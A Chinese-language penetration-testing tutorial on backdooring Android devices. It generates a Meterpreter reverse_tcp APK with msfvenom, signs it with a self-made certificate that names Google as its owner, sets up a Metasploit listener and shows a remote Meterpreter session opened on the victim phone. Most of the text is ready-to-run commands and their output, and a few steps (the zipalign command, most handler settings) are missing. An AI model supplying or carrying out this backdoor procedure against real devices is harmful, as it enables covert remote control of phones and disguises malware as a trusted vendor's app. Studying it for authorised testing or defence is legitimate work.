Android是一种基于Linux的自由及开放源代码的操作系统，主要使用于移动设备中，如智能手机和平板电脑等。对于Android系统，使用Metasploit渗透的最好方法就是创建后门程序。在Metasploit中，提供了android/meterpreter/reverse_tcp模块可用来创建Android后门程序。本文介绍通过创建后门程序，渗透攻击Android系统的方法。


渗透攻击Android系统。使用msfvenom命令创建Android后门程序。执行命令如下：


root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168. 1.108 LPORT=4444 R > /root/android.apk

No platform was selected, choosing Msf::Module::Platform::Android from the payload

No Arch selected, selecting Arch: dalvik from the payload

No encoder or badchars specified, outputting raw payload

Payload size: 8830 bytes


成功执行以上命令后，表示已经成功创建了Android格式（APK）文件的有效载荷。但是，现在Android移动设备一般不允许安装没有相应签名证书的应用程序，只安装带有签署文件的APK。所以，渗透测试者需要使用3个工具（keytool、jarsigner和zipalign）进行手动签名，然后才可以在Android系统上安装应用程序。下面介绍手动签名的方法。


对创建的有效载荷文件android.apk文件进行手动签名。在Kali Linux中，已经自带了keytool和jarsigner工具。虽然没有zipalign工具，但是提供了安装包，用户手动安装即可使用。下面这些操作将在Kali Linux中进行。具体操作步骤如下：


1）安装zipalign工具。执行命令如下：


root@kali:~# apt-get install zipalign


执行以上命令后，如果没有报任何错误信息，则说明成功安装了zipalign。


2）使用keytool工具创建秘钥库。keytool工具的语法格式如下：


keytool [选项]


keytool工具的常用选项及含义如下：


-genkey：在用户主目录中创建一个默认文件.keystore，还会产生一个mykey的别名。mykey中包含用户的公钥、私钥和证书。


-alias：产生别名。


-keystore：指定秘钥库的名称（产生的各类信息将不在.keystore文件中）。


-keyalg：指定密钥的算法，如RSA、DSA。如果不指定的话，默认使用DSA。


-validity：指定创建的证书有效期天数，默认为90天。


-keysize：指定秘钥长度。


-storepass：指定秘钥库的密码（获取keystore信息所需的密码）。


keypass：指定别名条目的密码（私钥的密码）。


-dname：指定证书拥有者信息。例如："CN=名字与姓氏，OU=组织单位名称，O=组织名称，L=城市或区域名称，ST=州或省份名称，C=单位的两字母国家代码"。


-list：显示密钥库中的证书信息。


-export：将指定的证书导出到文件中。


-file：指定导出到文件的文件名。


-delete：删除密钥库中的某个条目。


-printcert：查看导出的证书信息。


-keypasswd：修改密钥库中指定的条目口令。


-storepasswd：修改keystore口令。


-import：将已签名的数字证书导入密钥库。


接下来即可创建密钥库了，执行命令如下：


root@kali:~# keytool -genkey -v -keystore /root/key.keystore -alias android -keyalg RSA -keysize 2048 -validity 365 -storepass 123456 -dname "CN= Android,OU=Google,O=Google,L=IL,ST=NY,C=US"


正在为以下对象生成 2048 位RSA密钥对和自签名证书（SHA256withRSA）（有效期为 365 天）：


CN=Android, OU=Google, O=Google, L=IL, ST=NY, C=US

输入 <android> 的密钥口令   #为了方便记忆，直接回车

（如果和密钥库口令相同, 按回车）：

[正在存储/root/key.keystore]


从输出的信息中可以看到，密钥库被保存在/root/key.keystore文件中了。


3）使用JARsigner工具签名APK。语法格式如下：


jarsigner [选项] jar文件别名


JARsigner工具常用的选项及含义如下：


-verbose：签名/验证时输出详细信息。


-sigalg：签名算法的名称。


-digestalg：摘要算法的名称。


-keystore：秘钥库位置。


此时即可指定不同的选项对APK文件签名。执行命令如下：


root@kali:~# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/key.keystore /root/android.apk android

输入密钥库的密码短语: #输入秘钥库的密码短语，即创建秘钥库时设置的密码

输出的信息提示jar已签名。最后一行是警告信息，该条信息不影响对文件的签名，所以可以忽略该信息。

5）使用zipalign验证该APK文件。语法格式如下：


zipalign -v 4 [源APK文件] [新的APK文件]


在以上语法中，参数-v表示输出详细信息，4表示对齐为4字节。这里将在源APK文件（android.apk）验证后，重新保存为pentest.apk。


执行命令如下：

攻击载荷文件APK已经准备完成。接下来将该APK文件发送到目标Android系统，然后启动Metasploit监听器，等待与目标主机的连接。具体方法如下：


1）创建监听器，具体如下：

msf5 exploit(handler) > set payload android/meterpreter/reverse_tcp #加载Payload

经过以上的操作，攻击主机的监听器就建立完成了。


2）在目标Android系统上安装并运行攻击载荷APK（pentest.apk）文件。在运行APK文件后，目标Android系统将与攻击主机建立一个Meterpreter会话连接，具体如下：


[*] Sending stage (60790 bytes) to 192.168.1.110

[*] Meterpreter session 1 opened (192.168.1.108:4444 -> 192.168.1.110:33972) at 2017-05-07 17:55:47 +0800

meterpreter >


从以上显示的信息中可以看到，成功打开了一个Meterpreter会话连接。此时可以对目标主机的Android系统做进一步渗透。例如，查看目标系统信息：


meterpreter > sysinfo

Computer    : localhost

OS          : Android 4.1.1 - Linux 3.0.8+ (armv7l)

Meterpreter : java/android

meterpreter >


从输出的信息中可以看到，目标主机的操作系统为Android，其版本为4.1.1。
